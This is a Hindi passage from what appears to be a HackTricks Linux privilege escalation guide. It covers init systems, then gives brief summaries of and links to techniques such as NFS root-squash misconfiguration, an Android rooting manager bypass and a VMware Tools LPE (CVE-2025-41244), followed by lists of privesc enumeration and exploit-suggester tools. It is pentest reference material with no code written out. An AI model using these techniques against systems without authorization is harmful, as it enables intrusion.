दूसरी ओर, `/etc/init` का संबंध **Upstart** से है, जो Ubuntu द्वारा शुरू किया गया एक नया **सेवा प्रबंधन** सिस्टम है और सेवा प्रबंधन से जुड़े कामों के लिए configuration files का उपयोग करता है। Upstart पर जाने के बावजूद, Upstart की compatibility layer के कारण SysVinit scripts का उपयोग इसकी configurations के साथ अब भी किया जाता है।

**systemd** एक आधुनिक initialization और service manager है, जो on-demand daemon starting, automount management, और system state snapshots जैसी उन्नत सुविधाएँ देता है। यह distribution packages की files को `/usr/lib/systemd/` में और administrator के बदलावों को `/etc/systemd/system/` में रखता है, जिससे system administration की प्रक्रिया आसान हो जाती है।<sup>[[21]](#references)</sup>

## अन्य ट्रिक्स

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### प्रतिबंधित Shells से बाहर निकलना


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks आमतौर पर syscall को hook करके userspace manager को privileged kernel functionality उपलब्ध कराते हैं। Manager authentication कमज़ोर होने पर (जैसे, FD-order पर आधारित signature checks या कमज़ोर password schemes) कोई local app manager का रूप धारण कर सकता है और पहले से rooted devices पर root तक privilege escalation कर सकता है। इसके बारे में और जानें और exploitation की जानकारी यहाँ देखें:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## regex-based exec के ज़रिए VMware Tools service discovery LPE (CWE-426) (CVE-2025-41244)

VMware Tools/Aria Operations में regex-आधारित service discovery, process command lines से binary path निकालकर उसे privileged context में -v के साथ चला सकती है। ढीले patterns (जैसे, \S का उपयोग) writable locations (जैसे, /tmp/httpd) में attacker द्वारा रखे गए listeners से match कर सकते हैं, जिससे root के रूप में execution हो सकता है (CWE-426 Untrusted Search Path)।<sup>[[27]](#references)</sup>

इसके बारे में और जानें और अन्य discovery/monitoring stacks पर लागू होने वाला सामान्यीकृत pattern यहाँ देखें:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## कर्नेल सुरक्षा उपाय

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## अधिक सहायता

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc टूल्स

### **Linux local privilege escalation vectors खोजने के लिए सबसे अच्छा tool:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux और MAC में kernel vulns की enumeration [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**अधिक scripts का संकलन**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: cron द्वारा चलाए गए monitor के लिए forged .text_sig payload](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Linux में बुनियादी Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Linux Privilege Escalation गाइड](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Attack and Defend: 2016 की Linux Privilege Escalation तकनीकें](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [किसी को भी command execution की उम्मीद नहीं थी!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Linux Privilege Escalation)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Lab Exercises Walkthrough - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: Linux Privilege Escalation के लिए टिप्स और ट्रिक्स](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: Linux Enumeration और Privilege Escalation tool](https://github.com/rtcrowley/linux-private-i)
- [14] [Socket क्या है?](https://www.linux.com/news/what-socket/)
- [15] [Peppo (Proving Grounds) writeup](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [D-BUS के बारे में जानें](https://www.linuxjournal.com/article/7744)
- [17] [SUID Executables Linux Privilege Escalation](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo Part-2 – Linux Privilege Escalation](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Linux पर ACLs कैसे manage करें](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [network-scripts के ज़रिए Redhat/CentOS में root access](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [systemd क्या है?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (logs के ज़रिए bash arithmetic injection, पूरी chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – आप जो भी नाम दें, VMware उसे elevate कर देता है (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Sudo Chroot में privilege escalation](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – CVE-2025-32462 और CVE-2025-32463 Sudo privilege-escalation vulnerabilities](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [32] [Python importlib docs](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [@paragonsec का Tweet](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Linux पर Passwords की logging](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Logrotate Race Condition का विवरण](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
{{#include ../../../banners/hacktricks-training.md}}
